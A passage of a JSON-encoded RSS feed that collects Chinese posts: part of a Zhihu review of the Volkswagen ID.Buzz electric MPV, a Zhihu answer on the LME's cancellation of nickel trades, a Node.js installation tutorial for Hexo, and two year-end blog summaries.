data-private-watermark-src=\"v2-95c5274ef8a7cb3c9343156da1004a30\"></p>\n<p data-pid=\"cnwBfgoV\">中控台下部还有个可以展开/收起的杯架。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-451ead027d8d540e465894278467a351_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"690\" data-watermark=\"watermark\" data-original-src=\"v2-451ead027d8d540e465894278467a351\" data-watermark-src=\"v2-43176348363a835964f7d974b66f2196\" data-private-watermark-src=\"v2-fed611b60073b5af3cdf92a3f6e002f5\"></p>\n<p data-pid=\"Y8Yn7vEv\">前排座椅靠背处设计有放手机的储物袋，小桌板也是必须的。而且在小桌板上也能发现放iPad的槽以及杯架。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1f2bbb76ecbd581797f2256b87491049_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-1f2bbb76ecbd581797f2256b87491049\" data-watermark-src=\"v2-52c9f10c0f94a6bd6dc911199ee7aea4\" data-private-watermark-src=\"v2-669b808a1fc07e0236c01c10d8663024\"></p>\n<p data-pid=\"n2_P89Gm\">前后门板都有两层及以上的储物空间，方便放手机水瓶及其他杂物，后门板的储物槽处还有Type-C充电口。 </p>\n<p data-pid=\"Xi-gjf4l\">而且前门板里还隐藏有惊喜……………………</p>\n<p data-pid=\"XeETXZzq\">笑脸！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae0b6e1a35d6ee8d955847a9925eab4d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"712\" data-watermark=\"watermark\" data-original-src=\"v2-ae0b6e1a35d6ee8d955847a9925eab4d\" data-watermark-src=\"v2-48559c39dc0c083b13d703045ce2b684\" data-private-watermark-src=\"v2-70fc126fd0ce6a829b1edc669e78f08f\"></p>\n<p data-pid=\"j0004e-t\">类似这种彩蛋的小细节，在二排座椅底部、三排手枕处、前风挡玻璃都有车辆轮廓的剪影。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-43fd006ce7afa3ecf3826b51859a95ed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"watermark\" data-original-src=\"v2-43fd006ce7afa3ecf3826b51859a95ed\" data-watermark-src=\"v2-ce6f41741cb94c15e1fc387038250c1d\" data-private-watermark-src=\"v2-c339c79b212cae53a60b3fede3d63d4c\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-985608560bba934fddbc3c1b63bf621d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"661\" data-watermark=\"watermark\" data-original-src=\"v2-985608560bba934fddbc3c1b63bf621d\" data-watermark-src=\"v2-d375e357fcfb2e0d51765c3d03b34a86\" data-private-watermark-src=\"v2-02fd037de66794e79972503bbefa605c\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c98dd2e6bf14aaddfb09d73aa6106f55_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"695\" data-watermark=\"watermark\" data-original-src=\"v2-c98dd2e6bf14aaddfb09d73aa6106f55\" data-watermark-src=\"v2-6b904d7aaf0a9e0f6ed315853a9843d2\" data-private-watermark-src=\"v2-a0ff6fa796f998e1e4af3de2ee783618\"></p>\n<p data-pid=\"CK4YmBDa\">而且将“魔吧”里的抽屉打开后，除了车的剪影图案，侧面的纹路还酷似世界地图……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7a1d938803337cf0dc6dc1caf10acd82_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"662\" data-watermark=\"watermark\" data-original-src=\"v2-7a1d938803337cf0dc6dc1caf10acd82\" data-watermark-src=\"v2-4d3f99d021cd4f5725463548aa5219bf\" data-private-watermark-src=\"v2-fe485b4ce4fb511ff36fb781b88993a8\"></p>\n<p data-pid=\"58UmOvm6\">这些彩蛋让我想起沃尔沃XC90上的蜘蛛，这些欧洲设计师们还挺有意思的哈。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-64af52c40e49e203caad50b738c79a74_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-64af52c40e49e203caad50b738c79a74\" data-watermark-src=\"v2-bd645206c6ff4817526c50e6b9f9bda6\" data-private-watermark-src=\"v2-24274ffca23f178f311780682cfc27b7\"></p>\n<p data-pid=\"O0vaktXV\">尽管首发版本没有第三排，但是门板上方也都保留了杯架和储物槽。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a0f39b1d7c83abf52201f3198b7e85b2_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"953\" data-rawheight=\"558\" data-watermark=\"watermark\" data-original-src=\"v2-a0f39b1d7c83abf52201f3198b7e85b2\" data-watermark-src=\"v2-c2d5417b62487880b7f2eb4e1dd4a19a\" data-private-watermark-src=\"v2-809921588e6863846d490ffb5296d1f3\"></p>\n<p data-pid=\"koXlCB1S\">不过也有一个“概念很丰满，但现实很骨感”的设计——“魔吧”（这里跟荣威iMAX8借用一下这个词）。 </p>\n<p data-pid=\"NnJdWGDz\">概念车上的“魔吧”是这个样子的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b394c25f1fa1b1133858930e832ee464_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-b394c25f1fa1b1133858930e832ee464\" data-watermark-src=\"v2-47b842981013bc292decb21eea2d68d8\" data-private-watermark-src=\"v2-40126d17733af8545723a38f910c14c3\"></p>\n<p data-pid=\"hHxfT-Fj\">而实际首发的这个版本，车内连地板上的导轨都看不见……这也是令我最失望的点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a0beb0487f34dacdc3563ff4f660fef5_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-a0beb0487f34dacdc3563ff4f660fef5\" data-watermark-src=\"v2-d58717a8edac7399c1688e7c36895f0b\" data-private-watermark-src=\"v2-8e4bbaa01c1d5f39161e11d133546816\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8696470eda799645c0f9d0bded21cb21_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"485\" data-watermark=\"watermark\" data-original-src=\"v2-8696470eda799645c0f9d0bded21cb21\" data-watermark-src=\"v2-1e47b4f8728b97e83feb630adb4c1ee8\" data-private-watermark-src=\"v2-3333dd921e7fe4e27ec9dfd4ea979c24\"></p>\n<p data-pid=\"IjV1GIWJ\">量产版的这个扶手箱是可以拆卸的，但也仅停留在了可拆卸。</p>\n<p data-pid=\"KKHy9wsn\">需要的时候安装上，可以方便放一些东西，上部有可拆卸的隔片，底部还有抽屉；不需要的时候拆掉，也比较方便直接放书包，以及方便从前排走到后排。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-50e70ccdfdab81d0577c044e06825e15_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"954\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-50e70ccdfdab81d0577c044e06825e15\" data-watermark-src=\"v2-41a8141650896c50970420c2b45803cf\" data-private-watermark-src=\"v2-f7ec82bda249e02846edaab3029d12aa\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac7c1956cebd8d38e193b5b517b801cb_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1033\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-ac7c1956cebd8d38e193b5b517b801cb\" data-watermark-src=\"v2-cc1d4a2bad56396711f189098b86909a\" data-private-watermark-src=\"v2-18ea29f5f1c8f67a16356f461f417e1b\"></p>\n<p data-pid=\"ev-UjATu\">其实这样也挺好，你说呢？ </p>\n<h2><b>六、作为纯电MPV，续航怎么样？</b></h2>\n<p data-pid=\"VTF-TwWX\">很遗憾，这次官方并没有公布续航信息。</p>\n<p data-pid=\"SyM0Pey7\">最先进入欧洲市场的版本，配备的是一块82kWh的电池，由150kW的后电机提供动力（后驱），最大扭矩310Nm。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5ea59af2e8185175d725622ae8e6cbd8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"691\" data-watermark=\"watermark\" data-original-src=\"v2-5ea59af2e8185175d725622ae8e6cbd8\" data-watermark-src=\"v2-16049b9e41cbf5f54b250c054d58881f\" data-private-watermark-src=\"v2-a7076327cdee0eecd7f3519fbac84f9e\"></p>\n<p data-pid=\"jx1lZT7q\">交流慢充的充电功率为11kW；直流快充的充电功率可增加到170kW，可在 30 分钟内将电池从5%充到80%。通过软件系统更新，未来还将提供即插即充功能。 </p>\n<p data-pid=\"kUk7gzkR\">此外它还支持“双向充电”，也就是说万一家里没电时，可以为家里的供电系统供电，保持家里的灯常亮，而且还可将车内的电力输送到电网。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-348067c5048009ed11675b9c07ccb885_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1072\" data-rawheight=\"607\" data-watermark=\"watermark\" data-original-src=\"v2-348067c5048009ed11675b9c07ccb885\" data-watermark-src=\"v2-1e1dc99618650b9c44c56b428129860f\" data-private-watermark-src=\"v2-a64eca3893acc1dd5c98acd76ce7fe2a\"></p>\n<p data-pid=\"-QrIQT-j\">预计 2023 年还将推出更多具有不同功率不同电池容量的版本。至于其他信息，还是持续关注吧。</p>\n<h2><b>七、大众ID.Buzz智能化表现如何？</b></h2>\n<p data-pid=\"TtiGcmQr\">在智能化浪潮之下，开“面包车”就要比其他车更累吗？不，MPV的智能浪潮也正在来袭。 </p>\n<p data-pid=\"CmOXw8t_\">前面提过，大众一直在基于这款车在测试更高阶的自动驾驶。其实未来大众的L4级自动驾驶车辆就是基于它打造来的ID.Buzz AD。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2c5c5695a7fc1a0a2d58e93898b9c150_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"watermark\" data-original-src=\"v2-2c5c5695a7fc1a0a2d58e93898b9c150\" data-watermark-src=\"v2-53c2b05d9799add9e3fc04bf6a692258\" data-private-watermark-src=\"v2-fcb415f98d96b7540414e51cdd3e4939\"></p>\n<p data-pid=\"6poUirap\">而首发的这个版本在智能驾驶辅助方面也是颇有亮点的，比如它的Travel Assist驾驶辅助系统首次支持在高速公路上实现自动车道变换（从 90 km / h 开始）。其他像记忆泊车、前碰撞辅助、行人监测、车道辅助、停车辅助等等也都是有配备的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8d7cdc99122d3b3625ef2840043b747a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"545\" data-watermark=\"watermark\" data-original-src=\"v2-8d7cdc99122d3b3625ef2840043b747a\" data-watermark-src=\"v2-733b5ea6fee3e808c6daa8d6728b3745\" data-private-watermark-src=\"v2-62e75c1d94bf2b04bedd1798aa4f276a\"></p>\n<p data-pid=\"_ekPMns_\">总之，诞生于智能时代的它，可以让驾驶更轻松、更安全。</p>\n<h2><b>八、还有个厢货变体版本？</b></h2>\n<p data-pid=\"RTpiIgZD\">前文没怎么提到，这次ID.Buzz的全球首发，还有一个商用版（或者说厢式货车版本）的ID.Buzz Cargo。它与乘用版有什么不同之处，列几个要点简单说一下：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b353241ca7172952b7ce9296ac19cfa7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-b353241ca7172952b7ce9296ac19cfa7\" data-watermark-src=\"v2-b575c452614d356f598e28ac3d98bcab\" data-private-watermark-src=\"v2-e651297b0a990e230822cd525aea7e06\"></p>\n<p data-pid=\"pWV-ME3l\">造型差别并不大，主要是二三排车窗封闭，且左侧不再有侧滑门，后尾灯不再是贯穿式设计；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-84d31e07d5f6c82edf12c3583dd7238d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-84d31e07d5f6c82edf12c3583dd7238d\" data-watermark-src=\"v2-f371a9e2a8c0df8df49782b11958927c\" data-private-watermark-src=\"v2-33bde7b1ba2466ff869f683c159e519d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0199322d27f20ffc0540724459d418c1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-0199322d27f20ffc0540724459d418c1\" data-watermark-src=\"v2-105c7663eeaea9b02d5d08f2916b2407\" data-private-watermark-src=\"v2-5e763b1938123f62791c45ed75d0bdc4\"></p>\n<p data-pid=\"WzK4Zbm4\">出于货物运输需要，将来大概率还会提供对开的尾门开启方式；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a7611f831611c1ac188ddadb8167ba49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"watermark\" data-original-src=\"v2-a7611f831611c1ac188ddadb8167ba49\" data-watermark-src=\"v2-02657ec97dbbe8efed6e92f02c0594af\" data-private-watermark-src=\"v2-4940325b5ebce3e49ebdf45b562d1f49\"></p>\n<p data-pid=\"Y9eaeBAX\">前排拥有三个座椅——驾驶员座椅和双人长椅，座椅后面是固定隔板，以将货物隔开。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fc32d94bdfbb4c413498a3bb405a17ec_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-fc32d94bdfbb4c413498a3bb405a17ec\" data-watermark-src=\"v2-b9e357f5003a37c3cc5eaed81b84bc1d\" data-private-watermark-src=\"v2-d2f6655140052454cd74d72357ad65a2\"></p>\n<p data-pid=\"MUzycwUU\">至于动力系统和乘用版是一样的，续航等信息同样尚未公布。 </p>\n<hr>\n<p><img src=\"https://pic2.zhimg.com/v2-dde277d2eff563ddfa49d7fbc3dd7740_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-dde277d2eff563ddfa49d7fbc3dd7740\" data-watermark-src=\"v2-50db3408eded7d6667a119ba50ae8034\" data-private-watermark-src=\"v2-ac4635866e8396229f34fe2fd548a1b7\"></p>\n<p data-pid=\"Ls3YRCG1\"><b>不知看到这里，各位有何感受？</b></p>\n<p data-pid=\"Wg8FB-oq\">相信不少朋友想知道是否会引入国内、何时引入国内？但很遗憾目前还没有任何消息。官方公布的时间点只有2022年5月在欧洲开启预售、2023年长轴距版本在北美首秀、2024年在北美发售……</p>\n<p data-pid=\"Qplo9p_O\"> 但无论如何，个人是真心希望它能引入进来，为未来智能电动化MPV市场增添一份活力和新选择。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yang-lao-tian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">杨天所长</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/521084132/answer/2383445677?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/363430562?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价大众的纯电动MPV ID buzz？</a><br><a href=\"http://www.zhihu.com/question/25580234?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国产MPV车型里，最好的是哪个车型，求懂行的朋友给介绍下？</a><br>\n","link":"http://www.zhihu.com/question/521084132/answer/2383445677?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"LME 为何取消 3 月 8 日及以后的镍交易，会带来怎样的深远影响？","date":"2022-03-10 12:44:38","description":"\n<p data-pid=\"doPkrb1P\"> 严格意义上，LME不是在修改规则，而是依据他的交易规则在行使绝对的自由裁量权。<br> 因为他的交易规则RuleBook写了这样的条款:<br> 1.3 The Exchange may, at its <b>absolute discretion</b> and acting reasonably suspend trading on one or more of the Execution Venues for such period it considers necessary in the interests of maintaining a fair and orderly market. Trading will be resumed as soon as reasonably practicable following any such suspension of an Execution Venue.<br><br> 1.11 The Exchange reserves the right, acting reasonably and in its <b>absolute discretion</b>, to suspend or revoke the access of a Dealer, Member Representative and/or a Member and, where applicable, its Clients, to any systems and facilities (including any successor systems or facilities) of the Exchange, as the Exchange deems necessary, including (without limitation)the Ring, LME Select, the Matching System and LMEsword.<br><br> 大意就是LME可以自由裁量去决定暂停交易、取消交易。这个权利很大，不服，也可以根据英国法去打官司，这些是Rulebook里面约定的争议条款。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ad487b740fe7bd7448c04b7ecda76988_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2800\" data-rawheight=\"1866\" data-watermark=\"watermark\" data-original-src=\"v2-ad487b740fe7bd7448c04b7ecda76988\" data-watermark-src=\"v2-9f3bea4601530d6a3535d497f9df0585\" data-private-watermark-src=\"v2-3ae26d7146e01faac43484d2bd161cec\"></p>\n<p data-pid=\"oRXj_3wa\"><br><br> 当然，是不是交易所想怎么干，就怎么干？很多人觉得LME被HKEX买了，似乎就是我们想命令他们怎么做就怎么做了。个人感觉也没有这么简单。因为毕竟是一个国际性的交易所，而且还有英国的金融监管局在监管呢。如果瞎搞，罚款也会被罚惨的。现在，也有一些质疑交易所的声音。<br><br> LME在历史上也干过这种暂停交易的事，是在1985年的锡危机，算是LME的黑暗时刻吧。当时暂停锡交易停了整整四年，导致许多经纪商出问题。当时的有22国政府支持的国际锡委员会分崩离析了，无法拉抬和支撑锡的价格。<br><br> 所以，这次LME的公告里面，就要强调各种因素，以表明其采取此类措施的合理性。提到了镍价的史无前例的波动，也提到了俄乌战争对镍市场价格的影响。<br><br> 至于真正的原因，只能等着进一步披露,或者自己猜吧。目前根据金融时报FT的报道，已经有人质疑，为什么开这么大的空单，交易所也没有去查查这个客户有没有这么多存货。至于青山，也已经有了应对之策，媒体报道他已经从JPMorgan Chase以及中国建行得到了贷款去应对保证金危机。<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f74db3c2e23d478162ff7bdfad5f0f73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2246\" data-rawheight=\"558\" data-watermark=\"watermark\" data-original-src=\"v2-f74db3c2e23d478162ff7bdfad5f0f73\" data-watermark-src=\"v2-2e45a4c9489b38dca446dc8eb63bcd10\" data-private-watermark-src=\"v2-e4dab035108ba013b9e5f4cfc5248bc4\"></p>\n<p data-pid=\"rpI7_XeG\">Bloomberg的一篇评论给了一个思路如下:</p>\n<p data-pid=\"T3RxsNea\">如果价格剧烈波动导致平仓，可能导致一堆交易商破产，会导致后续的交易出现连锁问题，降低市场稳定性的预期。如果交易商还同时是生产商的话，你把他们搞破产了，反而不利于平稳镍价，因为你还指望他们继续生产更多的镍. </p>\n<p data-pid=\"RHjZQBFx\">因此，暂停一下交易，大家能够抓住时间窗口融资以增加保证金，在这种逼空的行情中，如果交易商是生产商的话，因为镍价猛涨对他们是好事，因此会有人给他们提供融资的。<br><br><br>至于许多网友想着的大国博弈，在脑海中经过几秒钟就完成了大棋局的下法，可以自行去发挥想像力。但一般来说，熟悉体制运作的人都清楚，一个事件，要层层上报，让领导搞清楚，再咨询专家，再到决策，没有这么快的。<br></p>\n<p data-pid=\"oZnsJ1Pv\">至于这几年，我们国家确实在争夺大宗商品的定价权，包括不断推进交易所的跨境业务，这些都在一点点地推进，比如上海黄金交易所有国际板，又比如上期所为交易原油，搭建了上海国际能源交易中心。这些都是有利于中国的经营环境以及话语权的。当然，这个过程涉及复杂的交易规则、境外仓库、相关保险等等问题，曾有机会还看过一些交易文本并提过意见建议。任重道远，一点点来。<br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fuwangezy?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">FU Wang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520801629/answer/2382981642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">106 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/520870307?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">伦镍史无前例暴涨， LME取消3月8日“逼空”交易，如何看待这一操作？</a><br><a href=\"http://www.zhihu.com/question/23557639?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">LME 的调期是怎么回事？</a><br>\n","link":"http://www.zhihu.com/question/520801629/answer/2382981642?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 